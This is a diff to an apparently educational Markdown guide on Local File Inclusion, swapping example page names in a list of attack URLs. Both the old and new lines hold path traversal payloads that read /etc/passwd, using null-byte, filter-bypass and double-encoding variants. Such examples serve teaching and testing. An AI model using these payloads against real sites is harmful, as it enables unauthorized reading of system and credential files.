@@ -66,8 +66,8 @@ Most files of interest are unlikely to be located in the same directory as the w
 ## Examples
 *Some examples of **LFI** attempts with different techniques:**
 ```
-https://vulnsite.io/page.php?file=/etc/passwd http://example.thm.labs/page.php?file=../../../../../../etc/passwd
-https://vulnsite.io/page.php?file=../../../../../../etc/passwd%00 
-https://vulnsite.io/page.php?file=....//....//....//....//etc/passwd 
-https://vulnsite.io/page.php?file=%252e%252e%252fetc%252fpasswd
+https://vulnsite.io/search.php?file=/etc/passwd https://vulnsite.io/settings.php?file=../../../../../../etc/passwd
+https://vulnsite.io/custom.php?file=../../../../../../etc/passwd%00 
+https://vulnsite.io/admin.php?file=....//....//....//....//etc/passwd 
+https://vulnsite.io/status.php?file=%252e%252e%252fetc%252fpasswd
 ```
